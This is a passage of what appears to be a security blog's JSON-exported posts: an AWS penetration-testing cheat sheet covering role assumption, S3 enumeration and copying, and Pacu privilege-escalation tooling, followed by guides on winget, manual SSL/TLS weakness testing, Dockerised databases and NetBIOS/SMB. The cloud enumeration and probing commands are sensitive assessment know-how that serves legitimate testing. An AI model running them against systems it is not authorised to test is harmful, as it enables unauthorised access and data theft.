|\n|--------------------------------------|---------------------------------------------------------------------------------------------|\n| Region                               | Geographical location containing availability zones                                         |\n| AZ (Availability Zone)               | Location mapped to a physical data centre in a region                                       |\n| VPC (Virtual Private Cloud)          | The network infrastructure (can include public and private subnets)                         |\n| EC2 (Elastic Compute Cloud) instance | Virtual Machine                                                                             |\n| Security Groups                      | Firewall rules applied to the single instance                                               |\n| Network ACL                          | Firewall rules applied to a subnet                                                          |\n| ELB (Elastic Load Balancer)          | Network load balancer to optimise traffic across instances.                                 |\n| IAM (Identity & Access Management)   | A service to manage users, groups, roles and security policies                              |\n| S3 (Simple Storage Service Bucket)   | A container for any type of data                                                            |\n| CloudTrail & CloudWatch              | Logging, Monitoring and Auditing of Events.                                                 |\n| RDS (Relational Database Service)    | A service allowing the creation of relational databases (MS SQL, Oracle, Aurora/MySQL, etc) |\n| KMS (Key Management Service)         | KeyChain, Password Vault, etc                                                               |\n\nhttps://cloudonaut.io/aws-security-primer/\n\n\n# Orientation \n\nConfigure the CLI for first usage\n```\naws configure --profile <profile name>\n```\n\n> It should be noted that the credentials will be stored in your home directory: `~/.aws/credentials`\n\nList AWS regions & VPC(s) available\n```\naws ec2 describe-regions\naws ec2 describe-vpcs\n```\n\nGet AWS console alias\n```\naws iam list-account-aliases\n```\n\nGet username associated to an AWS API KEY\n```\naws iam get-user\n```\n\nIf you have no access to IAM then the following command will work.\n```\naws sts get-caller-identity \n```\n\n## Getting Your Whereabouts\n\n\nFind Your ID\n```\naws sts get-caller-identity\n```\n\nLog in to the console\n```\nhttps://Your_Account_ID.signin.aws.amazon.com/console/\n```\n\n## Setting Up Temporary Credentials\n\nTo use the credentials returned by the assume-role \n\nIn Linux set some bash variables with export\n```\n$ export AWS_ACCESS_KEY_ID=XXXX\n$ export AWS_SECRET_ACCESS_KEY=XXXX\n$ export AWS_SESSION_TOKEN=XXXX\n```\n\nIn Windows do the equivalent with SET\n```\nC:\\> SET AWS_ACCESS_KEY_ID=XXXX\nC:\\> SET AWS_SECRET_ACCESS_KEY=XXXX\nC:\\> SET AWS_SESSION_TOKEN=XXXX\n```\n\n> Note that this will set the credentials for your default AWS account in your machine. This is similar to running `aws configure` without specifying a profile name. \n\nSecurity Groups vs Network ACLs\n\n| Security Group                                                                                                                                                | Network ACL                                                                                                                                            |\n|---------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------|\n| First layer of defence                                                                                                                                        | Second Layer of defence                                                                                                                                |\n| Operates at instance level                                                                                                                                    | Operates at subnet level                                                                                                                               |\n| Supports allow rules only                                                                                                                                     | Supports allow and deny rules                                                                                                                          |\n| \"stateful\": Return traffic is automatically allowed regardless of any rules                                                                                   | \"stateless\": Return traffic must be explicitly allowed by the rules                                                                                     |\n| All rules are evaluated before deciding if traffic is allowed                                                                                                 | Rules are evaluated in order when deciding to allow traffic                                                                                            |\n| Applies to an instance only if someone specifies the security group when launching the instance, or associates the security group with the instance later on. | Automatically applies to all instances in the subnets it's associated with (therefore, you don't have to rely on users to specify the security group). |\n\n## Installing AWS CLI\n\n\n\n\n## Enumerating With AWS CLI\n\n\n\n### S3 Buckets\n\n\n```\naws sts assume-role --role-arn arn:aws:iam::093313834310:role/pentesterRole --role-session-name pentesterRole --profile assessment\n```\n\n\nListing Buckets\n```\naws s3 ls \naws s3api list-buckets \n```\n\n\nCopy File From Bucket To Current Directory\n```\naws s3 cp s3://this-will-be-the-bucket-name/the-name-of-the-file.txt . \n```\n\n\n\n## Networking Configuration Review \n\n### Using Cloud Mapper\n\n<h5 class=\"step\">Edit the config.json file to enter the AWS ID</h5>\n\nWe can edit the config file via the `cloudmapper.py` python script. \n```\npython cloudmapper.py configure add-account --config-file <config.json> --name <arbitrary name> --id <AWS Account ID>\n```\n\nOr we can just directly edit the config.json file using your prefered editor. Which of course is `vi` ;-)\n```\nvi config.json\n```\n\n<h5 class=\"step\">Prepare and start the Web Server</h5>\n\n\nFirst we prepare\n```\npython cloudmapper.py prepare --config <config.json> --account <arbitrary_name>\n```\n\nThen we start\n```\npython cloudmapper.py webserver\n```\n\n## ScoutSuite\n\n\nInstalling ScoutSuite\n```\n$ git clone https://github.com/nccgroup/ScoutSuite\n$ cd ScoutSuite\n$ virtualenv -p python3 venv\n$ source venv/bin/activate\n$ pip install -r requirements.txt\n$ python scout.py --help\n```\n\nWe can run ScoutSuite in the following way. We use the `--profile` to specify API credentials to use. \n```\nscout.py --provider aws --profile <profile_name>\n```\n\n> Specifying the provider type (aws) and credentials is mandatory. \n\nWe can specify a report directory to store results with the `--report-dir` flag. \n```\nscout.py --provider aws --profile <profile_name>  --report-dir <folder>\n```\n\nWe can specify which regions we want ScoutSuite to look at with the `--regions` flag. \n```\nscout.py --provider aws --profile <profile_name> --region us-east-1,eu-west-1\n```\n\nWe can limit the services we want to check for\n```\nscout.py --provider aws --profile <profile_name> --services iam,s3\n```\n\nThere are other flags that may be of interest which can be found by looking at the help `--help`\n```\nscout.py --help\n```\n\n## Priv Escalation\n\n\nPmapper tool by NCC \n\n\n### Pacu\n\n\n<a href=\"https://github.com/RhinoSecurityLabs/pacu\" target=\"_blank\" class=\"external\" title=\"Pacu Tool By Rhino Security Labs\" rel=”nofollow”>Pacu Tool By Rhino Security Labs</a>\n\n\nInstalling Pacu\n```\npip3 install pip\npip3 install -U pacu\npacu\n```\n\nEnumeration of the root user. Can be done manually but after a few attempts, it requires a captcha. \n\n\nEnumeration of Account ID via \n```\nIAM -> Roles > Elevate-S3 > Edit trust policy\n```\n\nThe team over at Rhino Security have a great write up on how to enumerate users via this process. <a href=\"https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/\" target=\"_blank\" class=\"external\" title=\"AWS IAM User Enumeration\" rel=”nofollow”>Rhino Security Labs - AWS IAM User Enumeration</a>\n\n\n## Steam Pipe\n\n\nRunning SteamPipe\n```\nsteampipe check benchmark.cis_v140 --export=report.html --export=report.csv\n```\n\n\n## Prowler\n\n\nRunning Prowler. Use the `-p` flag to specify API profile to use\n```\n./prowler -p <profile_name>\n```\n\nUse `ansi2html` if you want an HTML report\n```\npip install ansi2html\n./prowler -p <profile_name> | ansi2html -la > report.html\n```\n\n## Assessing AWS\n\n> The following is a very generic methodology you can use until you refine your own approach via experience. \n\n* Launch Scout Suite to collect configuration data and initial list of issues\n* Launch prowler and collect list of issues\n* Review Trusted Advisor (if available for the account)"},{"fields":{"slug":"/a-guide-on-how-to-winget"},"excerpt":"Winget is the name of Microsofts new package manager. A package manager is a tool designed to help you quickly search for and install other…","frontmatter":{"date":"9th February 2022 ","title":"A Guide On How To Winget","description":"In this tutorial, we will take a look at Microsofts new package manager. A package manager is a tool designed to help you quickly search for and install other tools that your operating system supports. Microsoft's offering is called Winget.","tags":"winget","posttype":"tutorial"},"body":"Winget is the name of Microsofts new package manager.  A package manager is a tool designed to help you quickly search for and install other tools that your operating system supports.  Windows users have waited a long time for a native package manager offering from Microsoft. Until now the best offering has been chocolatey; however, after exploring some of the features I will show you in this tutorial I have made the switch.\n\n* Winget does not come installed by default. \n* There are several ways to install it\n  - Microsoft Store\n  - Release On Github\n  - Being a Member of the Windows Insiders Program (Free but may take time to appear as an install option.)\n\n![Winget Not Installed By Default](/static/3473ff07-a0b0-4652-8acd-58a5e0c2028c.png)\t\n\nWinget only supported on certain OS Versions.\n@todo: Enter OS that Winget Supports\n\n![CMD Version](/static/1423747c-29b1-4338-b389-f34eab49ddfb.png)\n\n* Because you will be using Winget to install the software you typically need to open up the console as an Administrator. \n\nIn this tutorial, we will be installing from Github however you can just as easily install this from the Windows Store if you have it enabled. \n* It can take a few days for the option to install Winget to appear \n\nI will be installing this release\n* https://github.com/microsoft/winget-cli/releases/tag/v1.2.10271\n\n\n![Installing Winget From Github](/static/3028d678-c368-4761-944a-2a448d8de2c4.png)\n\nAfter you click to download you can install by selecting open. This saves you having to save to disk, find the file and then having to click again to install. \n\n![Click on Open To Install](/static/6e4154f2-466b-4bf6-bf0b-44841fdb29e3.png)\n\nWindows will now install winget. We can verify this by seeing the version \n```\nwinget --version\n```\n\n![Winget Version](/static/499a492e-fdda-43de-a35a-9ca967dc4452.png)\n\nThe first time you actually use Winget for anything other than verifying its version you will see an agreement acceptance response like that below. \n\n![Accepting The Agreement](/static/00a6de3e-dac2-4ae2-955d-d38f2bd3eef5.png)\n\n\nWe can list packages currently installed on our machine. \n```\nwinget list\n```\n\n![Listing Packages Installed On The Machine](/static/538a8041-358f-4155-be0c-d9cbc2670bed.png)\n\nWe can query these packages \n```\nwinget list -q <term>\n```\n\n![Querying The List](/static/b7543e67-b171-47dc-b1ee-330d3d953be7.png)\n\nWe can show only the first `n` number of results\n```\nwinget list -n 10\n```\n\nSearching for new packages\n```\nwinget search <term>\n```\n\n![Searching Winget For The Term Git](/static/34d462bf-5a6f-4b4b-9ac0-58c3d38cddb6.png)\n\nIf you look at the last example you can see Winget searching for packages from two sources. We can list the sources that Winget knows about. \n\n```\nwinget source list\n```\n\n> Note you can install additional sources but that is out of scope for this tutorial. This is just a crash course to get you started. \n\n\nWe can also inspect a source. \n\n![Inspecint A Source](/static/ce39df38-f611-405a-aced-f0badd8b2b47.png)\n\nOkay, let us go back to searching.  This time we will limit our search to a source. \n\n![Searching By Source](/static/28a09c06-002d-4162-9b83-823e44c94bcb.png)\n\nWe can also search by Tag\n```\nwinget search --tag github\n```\n\n![Searching By Tag](/static/513804fc-8bce-499e-a753-e8e1fd76a32c.png)\n\nWe will now look at installing packages. We will look at a worked example using Microsoft Visual Studio Code. \n\nFirst, we will search. \n\n![Searching For Microsoft Visual Studio Code](/static/576dd63e-cb51-44c0-bbf0-1e45dca2d7de.png)\n\nThe top result looks like what we want. We can use the `show` subcommand to find more information. \n\n![Using The Show Command](/static/937e36c4-3bd2-4a63-bccc-efc82e4860c1.png)\n\n\nIf you look at the arrow we can see the package has a moniker. Typing `Microsoft.VisualStudioCode` with the install command would work but it is a lot to type. Instead, we can reference the package using the moniker. \n\n\n![Referencing By Moniker](/static/965b468d-94aa-485c-99dd-9f8412668318.png)\n\nWe can now install the package\n```\nwinget install vsscode\n```\n\n![Installing Visual Studio Code](/static/3a9134d0-16b8-4b59-aaa6-b4ad84f84d1e.png)\n\nGreat so our package is now installed. \n\nWhen installing you may see UI windows open like in the screenshot below. \n\n![Installing the Github CLI](/static/f43a3347-59c3-4dd0-8893-e0f64d56b23f.png)\n\nWe can prevent that happening, however. \n\nFirst I will show you how to uninstall a package and then we will install it a second time without the UI prompts. \n\nUninstalling \n```\nwinget uninstall Github.cli\n```\n![Uninstall Github CLI](/static/e8b7f955-ffc7-43ce-803f-e925dc5a336d.png)\n\nInstalling with the `--silent` flag. \n\n![Installing Silentlly](/static/7ce4226c-49e4-4a9a-9127-6c2a655d1baf.png)\n\nI have gone ahead and installed a few other programs and I like the collection of packages I have installed. What if I wanted to save this combination of packages for installation on another machine. \n\n```\nwinget export -o <file path>\n```\n![Exporting List Of Packages](/static/ed2c9105-f0ab-417a-8de1-a64c7ecbead3.png)\n\nWe can see that some Windows Packages do not have packages available in the Microsoft Store or in the Winget repository. \n\nLet us check the file we saved. Here it is where we specified on the desktop.\n\n![Winget Output](/static/ad40e2ad-b3ef-4bd4-b269-87fb324455c7.png)\n\nIf we look inside we can see the file is in JSON and we can see a collection of packages I have installed. \n\n![Winget Packages Output Contents](/static/1b919405-011b-490a-9273-469437feab00.png)\n\nI have removed some of the packages I installed but not all. Now I want to get the system up to sync. \n\n![Checking Packages](/static/0f1eeceb-4f94-4989-8d4d-d089b8bc577f.png)\n\nAs Winget gets to packages that are either not installed or have upgrades it gets to work. \n\n![Installing and updating missing packages](/static/dc2c1021-aaac-42b8-8776-53f1e06e45be.png)"},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-manually-testing"},"excerpt":null,"frontmatter":{"date":"3rd February 2022 ","title":"Vulnerabilities in SSL & TLS :- Manually Testing","description":"As OpenSSL has improved, it has become more challenging to use one binary for testing the full range of modern to legacy SSL/TLS configurations. The reason for that is following Heartbleed; the OpenSSL developers started a significant overhaul, part of which included the elimination of outmoded cryptography.","tags":"ssl, tls","posttype":"article"},"body":"# OpenSSL For Testing\n\nAs OpenSSL has improved, it has become more challenging to use one binary for testing the full range of modern to legacy SSL/TLS configurations. The reason for that is following Heartbleed; the OpenSSL developers started a significant overhaul, part of which included the elimination of outmoded cryptography. While this is fantastic news for customers from now on; it means we may need to employ two versions of the OpenSSL binary during our engagements to test for a wide range of conditions: one binary for the new features such as TLS v1.3 and one binary for testing old protocols and Cipher configurations such as when testing if a service supports SSL v2.0.\n\nWe can compile out own version of OpenSSL for testing legacy environments. If we start with the OpenSSL 1.0.2g source code, we can make the static binary as follows.\n\n```\n::text\ncd /tmp\nwget https://openssl.org/source/openssl-1.0.2g.tar.gz\ngunzip openssl-1.0.2g.tar.gz\ntar -xvf openssl-1.0.2g.tar\ncd /tmp/openssl-1.0.2g/\n./config  --prefix=/opt/openssl-1.0.2g --openssldir=/opt/openssl-1.0.2g no-shared enable-ssl2 enable-ssl3 enable-weak-ssl-ciphers\nmake depend \nmake all\n```\n\nWe can now test what we have compiled and make sure we are referencing the correct binary for our needs. If we supply the `openssl` binary with no options, we should be presented with an interactive prompt. To confirm the OpenSSL version, type as follows.\n\n```\n/opt/openssl-1.0.2g/bin/openssl                                                                                                                                                          \nOpenSSL> version\nOpenSSL 1.0.2g  1 Mar 2016\nOpenSSL> \n```\n\nWe can compare that to my current binary in Kali Linux. \n\n```\n/usr/bin/openssl \nOpenSSL> version\nOpenSSL 1.1.1l  24 Aug 2021\nOpenSSL> \n```\n\nWe can see that OpenSSL 1.0.2g was released 1 March 2016, and version 1.1.1l was released 24 August 2021. Using the `openssl ciphers` syntax, we see more than just a version number,date and release separating these binaries.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/6b0fdc3f-f387-44ca-9ddc-08cacb6cc151.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Number of Ciphers Supported Between Versions  1.1.1l and 1.0.2g</figcaption></figure>\n\n## Connecting\n\nOpenSSL provides different features and tools for SSL/TLS related operations. We can see a list of these standard commands running the following syntax.\n\n```\nopenssl list-standard-commands\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/b644efe1-38f3-49b1-a45c-eb4b57693e5b.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Cropped Image of OpenSSL Binary Listing Standard Commands</figcaption></figure>\n\n\nAs can be seen, the OpenSSL binary provides many different features and tools for operations related to working with the TLS and SSL protocol. One of these tools, the s_client tool, connects, checks, and lists HTTPS and TLS/SSL-related information. We can assess services using SSL or TLS encryption for our customers using this tool. But first, let us look at its basic usage.\n\nWe will look at one of the most common uses for using the OpenSSL s_client tool, connecting to a remote TLS/SSL website. We provide it with a target and a port number to do this.\n\n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -connect evilsaint.com:443\n```\n\nThis command connected to the evilsaint.com web server on port 443, attempted a full TLS/SSL handshake, and then printed out the following information.\n\n1. The connection status\n2. Chain Verification Status\n3 The certificate chain the server sent \n4 The peer certificate in base64 encoded format\n5 Details regarding the rest of the handshake. \n\n\nAs we move on to expanding on this example it might be prudent to talk about the `-connect` switch.  The connect switch can take any TCP IP address or FQDN. If we looked up the IP address for evilsaint it would show as 192.248.151.138. We could replace the evilsaint.com with the resolved IP address and it would still reach out to attempt a handshake with the webserver. \n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -connect 192.248.151.138:443\n```\n\nWhat if the IP address we were connecting to hosted multiple websites? If we take a look at the following Apache Web Server configuration example (below), we can see there is run server running on the IP Address 172.20.30.40 and there are two domains 'www.example.com' and 'www.example.org'.\n```\n# This is the \"main\" server running on 172.20.30.40\nServerName server.example.com\nDocumentRoot \"/www/mainserver\"\n\n<VirtualHost 172.20.30.50>\n    DocumentRoot \"/www/example1\"\n    ServerName www.example.com\n\n    # Other directives here ...\n</VirtualHost>\n\n<VirtualHost 172.20.30.50>\n    DocumentRoot \"/www/example2\"\n    ServerName www.example.org\n\n    # Other directives here ...\n</VirtualHost>\n```\n\nJust how if you configured virtual hosting with Apache, you would use the domain name to distinguish between multiple websites hosted on the same server. We can do the same with the `-servername` flag. The `-servername` flag lets us set the Server Name Indication (SNI) in the ClientHello message to the given value.  The `-connect` switch is used to establish the TCP connection and can be a FQDN or IP address. The `-servername` is used to specify the domain hostname. If the `-servername` option is empty then openssl sends the same DNS name as what is used for the `-connect` option. If an IP is specified for the `-connect` option and the `-servername` is not provided then the default behaviour since OpenSSL 1.1.1 is to set SNI is to \"localhost\".  \n \n\nHere are two examples demonstrating the same IP address but specifying two different domains. \n```\n::text\nopenssl s_client -servername domain.com -connect X.X.X.X:443\nopenssl s_client -servername domain2.com -connect X.X.X.X:443\n```\n\nLet us move on and discuss a few more switches that can aid our queries. \n\n* -crlf\n* -showcerts\n\nThe addition of the `-crlf` flag. This flag translates line feeds from your terminal into character return & line feeds (CR+LF) that are required by some servers. The `-showcerts` option can be useful when you need to see all certificates returned from the server. \n\nLet us look at an example\n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -crlf -showcerts -connect evilsaint.com:443 -servername www.evilsaint.com\n```\n\n## Automated Testing \n\nThe purpose of this article is to look at ways of manually testing for TLS/SSL weaknesses and so for the most part I want to avoid discussion on popular tools such as testssl, sslyze and sslscan. With that said, after seeing the support for various ciphers and protocols change between versions of the OpenSSL binary versions I am sure there will be those that are interested in how these tools over come this problem and would like to make sure they are testing using a particular version of OpenSSL. \n\n**Testssl**\nTestssl is a bash script that is a direct wrapper around the openssl binary. When you start any scan the output will tell you which version of the binary it used to complete its tests. To change the binary that testssl uses we can enter it as an option when running the command. \n```\n::text\ntestssl.sh openssl=/path/to/openssl <URI>\n```\n\nLet us compare the default system binary to our newly compiled one. \n```\n::text\ntestssl --openssl=/opt/openssl-1.0.2g/bin/openssl https://evilsaint.com\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/2a69cc1d-4400-4ff3-8875-0da4e92e1158.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Support for ~142 Ciphers </figcaption></figure>\n\n```\ntestssl https://evilsaint.com\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/10d48df7-e237-4dcc-8fa6-7ec25875b8c9.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Support for ~81  Ciphers</figcaption></figure>\n\n**SSLScan**\nIf you complete the following on a terminal you will likely find that SSL Scan has been compiled to use the local system binary and there doesn't appear to be an option for sepcifying the openssl binary. \n```\nsslscan --version            \n```\n\nAll however is not lost. SSL Scan 2 has had a major backend code rewrite which means it is no longer reliant on the version of OpenSSL for many of the checks it performs.  Meaning it is possible to support legacy protocols such as SSLv2 and SSLv3 regardless of the version of OpenSSL that is has been compiled against. \n\n**SSLyze**\nSSLyze is an nearly all Python code project but similar to other tools it requires access to low-level OpenSSL functionality. In order to satisfy this the author has created an OpenSSL wrapper written in C code which is called nassl. This was specifically developed for SSLyze. \n\n\n## Manually Testing For Vulnerabilities\n\n### Check For SSL v2 Support\n\nIn addition to the vulnerabilities support for Version 2 of SSL allows it should be noted that in terms of real life practicality, Microsoft has stopped supporting SSL 2.0 in the Windows 10 operating system and IE6 was the last browser that supported SSL version 2 by default. There should be very little reason, if any, to support SSL version 2.0\n\nTo check whether SSLv2 is enabled on the remote host, the following command can be used: \n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -ssl2 -connect evilsaint.com:443\n```\n\nIf SSLv2 is supported, the handshake will complete and server certificate information will be returned. \n\n\nAlternatively to using the OpenSSL command line tool that you can try and use Curl. \n\n```bash\ncurl --sslv2 -I evilsaint.com:443\n```\n\nCheck the output, you want to see something similar to the following:\n```\n* SSL peer handshake failed\n```\n\nAs opposed to \n```\n* SSL 2.0 connection using SSL_NULL_WITH_NULL_NULL\n```\n\n### Check For SSL v3 Support\n\nTo test whether a system supports SSLv3, the following OpenSSL command can be used:\n```\n::text\nopenssl s_client --sslv3 -connect evilsaint.com:443\n```\n\nIf SSLv2 is supported, the handshake will complete and server certificate information will be returned. \n\n\nAlternatively to using the OpenSSL command line tool that you can try and use Curl. \n\n```\n::text\ncurl --sslv3 -I evilsaint.com:443\n```\n\nCheck the output, you want to see something similar to the following:\n```\n* SSL peer handshake failed\n```\n\nAs opposed to \n```\n* SSL 3.0 connection using SSL_NULL_WITH_NULL_NULL\n```\n\n\n### Cipher Suites\n\n\n```\nopenssl s_client -cipher\n```\n\n```\n::text\nnmap --script ssl-enum-ciphers -p 443 example.com\n```\n\n### Server Certificate\n\n```\n::text\nopenssl s_client -connect example.com:443 | openssl x509 -noout -text\n```\n\n\n### Secure Renegotiation \n\n\nThe following demonstrates how to verify if a system supports secure renegotiation.\n\n```\n::text\nopenssl s_client -connect example.com:443\n```\n\n### Client Initiated Renegotiation\n\nThe following demonstrates how to check if client initiated renegotiation is supported.\n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nOnce the connection is established, the server will wait for us to type the next command. We can write the following two lines in order to initiate a renegotiation by specifying R in the second line, followed by enter or return.\n\n```\n::text\nopenssl s_client -connect host:port\nHEAD / HTTP/1.0\nR\n<Enter or Return key>\n```\n\n### TLS Compression\n\nTo test whether a server supports TLS compression, and is vulnerable to CRIME, the following method can be used: \n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nFor servers that have TLS compression disabled, the response will be similar to the following. The \"Compression: NONE\" shows that this server rejects usage of TLS-level compression.\n\n### HTTP Compression\n\nTo test whether a server supports deflate or compression, the following steps can be performed: \n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nSubmitting the following will allow us to see if HTTP compression is supported by the server.\n```\nGET / HTTP/1.1\nHost: example.com\nAccept-Encoding: compress, gzip\n```\n\n### Change Cipher Spec Injection\n\nA weakness exists in some versions of OpenSSL which can be exploited by intermediary third parties in order to retrieve sensitive information from encrypted communication.\n\nAffected Versions:\n\n•    OpenSSL 1.0.1 through 1.0.1g\n•    OpenSSL 1.0.0 through 1.0.0l\n•    all versions before OpenSSL 0.9.8y\n\nTesting requires using publicly available tools, such as the the ‘ssl-ccs-injection’ nmap script by Claudiu Perta, which can be used to test for this vulnerability. This script can be downloaded from https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html.\n\n```\n::text\nnmap -p 443 --script ssl-ccs-injection example.com\n```\n\n### Heartbeat - TLS Extension\n\n\n```\n::text\nopenssl s_client –tlsextdebug\n```"},{"fields":{"slug":"/learn-mssql-and-postgre-sql-with-docker"},"excerpt":"In this tutorial, we will be using Docker to spin up database containers for us to enumerate. There are many articles on setting up and…","frontmatter":{"date":"1st February 2022 ","title":"Learn MSSQL and PostgreSQL with Docker","description":"In this tutorial, we use Docker to spin up database containers for us to practice our enumeration skills. At the end of this tutorial you will have run MSSQL Server 2019 from Microsoft and PostgreSQL inside docker container and enumerated them with `sqlcmd` and `psql` commands.","tags":"database, docker, mssql, postgresql, psql, sqlcmd","posttype":"tutorial"},"body":"\nIn this tutorial, we will be using Docker to spin up database containers for us to enumerate. There are many articles on setting up and installing docker on your favourite platform so this tutorial will start from the point where docker is already installed. \n\n## Installing Databases\n\nFor this tutorial, we will be using Docker containers for MSSQL Server 2019 and PostgreSQL 14.\n\nThe official docker hub page for Microsoft MSSQL Server 2019 and PostgreSQL are located at the following URL. \n\n* https://hub.docker.com/_/microsoft-mssql-server\n* https://hub.docker.com/_/postgres/\n\nBefore we start configuring our containers we should touch on some basics.  If we use the `docker pull` command we can pull a Docker image from the Docker hub to our machine. Pulling an image just gives us access to that image for when we need it. If however, we use the command `docker run` it will check if the image has already been pulled and if it hasn't been pulled previously this will pull the image and then run it\n\nMost docker installation guides take the user through the process of installing Docker and then running a \"Hello World\" example. The following example is the Docker equivalent of a programmers \"Hello World\" script\n\n```\n$ docker run hello-world\nUnable to find image 'hello-world:latest' locally\nlatest: Pulling from library/hello-world\n1b930d010525: Pull complete \nDigest: sha256:6f744a2005b12a704d2608d8070a494ad1145636eeb74a570c56b94d94ccdbfc\nStatus: Downloaded newer image for hello-world:latest\n```\n\nWe can see that when we used the `docker run` command that Docker was \"Unable to find 'hello-world:latest' locally\" so it made a pull. \n\n## Microsoft SQL Server\n\nRunning MSSQL Server 2019\n```\ndocker run --name sqlserver2019 -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=Password123' -p 1433:1433 -d mcr.microsoft.com/mssql/server:2019-latest\n```\n\nCompared to the simple \"Hello World\" example we just looked at we can see the MSSQL Database requires a few more command-line arguments. \n\n\ndocker run --name sqlserver2019-2 -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=Password123' -p 2433:1433 -d mcr.microsoft.com/mssql/server:2019-latest\n\n## PostgreSQL\n\n\ndocker run --name postgresql -p 5432:5432 -e POSTGRES_PASSWORD=Password123 -d postgres:latest\ndocker run --name postgresql -p 6432:5432 -e POSTGRES_PASSWORD=Password123 -d postgres:latest\n\n\n## Interacting with Microsoft SQL Server\n\nLog into sqlserver2019 docker container\n```\ndocker exec -it sqlserver2019 bash\n```\n\nView OS information\n```\ncat /etc/os-release\n```\n\nLog into SQL Server using SQLCMD command line tool\n```\n/opt/mssql-tools/bin/sqlcmd -U sa -P Password123\n```\n\nView version information\n```\nSELECT @@Version;\nGO\n```\n\nList databases currently on the server\n```\nSELECT name FROM sys.databases;\nGO\n```\n\nCreate a new database\n```\nCREATE DATABASE evilsaint;\nGO\n```\n\nQuit SQLCMD CLI tool\n```\nexit\n```\n\nExit out of the docker container\n```\nexit\n```\n\n## PostgreSQL\n\nLog into postgresql docker container\n```\ndocker exec -it postgresql bash\n```\n\nView OS information\n```\ncat /etc/os-release\n```\n\nLog into PosgreSQL server using PSQL command line tool\n```\npsql -U postgres\n```\n\nView help documentation\n```\nhelp\n```\n\nList databases currently on the server\n```\n\\l\n```\n\nCreate a new database\n```\nCREATE DATABASE evilsaint;\n```\n\nQuit PSQL CLI tool\n```\n\\q\n```\n\nExit out of the docker container\n```\nexit\n```\n\nRun postgresql database 2 for bruteforce\n```\ndocker exec postgresql-2 bash\n```\n\n\n\n## Docker Commands\n\nview all running containers\n```\ndocker ps\n```\n\nview all containers regardless of status\n```\ndocker ps -a\n```\n\nstop a container\n```\ndocker stop sqlserver2019\n```\n\nstart a container\n```\ndocker start sqlserver2019\n```\n\nremove a container\n```\ndocker rm sqlserver2019\n```"},{"fields":{"slug":"/protocol-dissection-net-bios-and-smb"},"excerpt":null,"frontmatter":{"date":"28th January 2022 ","title":"Protocol Dissection :- NetBIOS & SMB","description":"This article examines the two protocols NetBIOS and SMB. SMB ran on top of the NetBIOS protocol in early versions of Windows, but eventually moved to its own dedicated TCP port. While NetBIOS is the older protocol, understanding both is nearly essential for understanding Windows network communications. The SMB protocol enables networked computers' applications and services to communicate via Inter Process Communication (IPC) and to share files.","tags":"netbios, smb","posttype":"article"},"body":"##What is NetBIOS?\n\nNetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model, allowing applications on separate computers to communicate over a local area network. \n  \nNetBIOS is an API and not a networking protocol.  \n\n##How does NetBIOS operate?\n  \nOlder operating systems ran NetBIOS using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols.  \n  \nIn modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name.  \n\n##What are the benefits of NetBIOS?\n  \nNetBIOS provides three distinct services:  \n  \n* Name service (NetBIOS-NS) for name registration and resolution.  \n* Datagram distribution service (NetBIOS-DGM) for connectionless communication.  \n* Session service (NetBIOS-SSN) for connection-oriented communication.  \n\n##What is SMB?\n  \nN.B. SMB, an upper layer, is a service that runs on top of the Session Service and the Datagram service, and is not to be confused as a necessary and integral part of NetBIOS itself. It can now run atop TCP with a small adaptation layer that adds a packet length to each SMB message; this is necessary because TCP only provides a byte-stream service with no notion of packet boundaries  \n\n##How does SMB operate?\n  \nSMB can run on top of the Session (and lower) network layers in several ways:  \n  \n* Directly over TCP, port 445  \n* Via the NetBIOS API on UDP ports 137, 138 &amp; TCP ports 137, 139 (NetBIOS over TCP/IP);  \n\n##What are the benefits of SMB?\n\nThe SMB \"Inter-Process Communication\" (IPC) system provides named pipes and was one of the first inter-process mechanisms widely available to programmers, allowing services to inherit the authentication performed when a client first connected to an SMB server. \n  \nSince Windows 2000, SMB has been running with a thin layer on top of TCP, similar to the Session Message packet of NBT's Session Service, using TCP port 445 rather than TCP port 139; this is known as \"direct host SMB.\" \n  \n## SMB Versions\n\n### Version Summary:  \n\n* SMB1 – Windows 2000, XP and Windows 2003.  \n* SMB2 – Windows Vista SP1 and Windows 2008  \n* SMB2.1 – Windows 7 and Windows 2008 R2  \n* SMB3 – Windows 8 and Windows 2012.  \n\n### SMB 2.0\n\nMicrosoft introduced a newer version of the protocol (SMB 2.0 or SMB2) with Windows Vista in 2006  \n\n### SMB 2.1\n\nWith Windows 7 and Server 2008 R2, a new opportunistic locking mechanism was introduced, resulting in minor performance improvements. \n  \n### SMB 3.0 (previously SMB 2.2)\n\nWas introduced with Windows 8 and Windows Server 2012.  \n  \n### SMB 3.0.2 \n\nIntroduced with Windows 8.1 and Windows Server 2012 R2. In 3.0.2, the earlier SMB version 1 can be optionally disabled to increase security.\n   \n### SMB 3.1.1 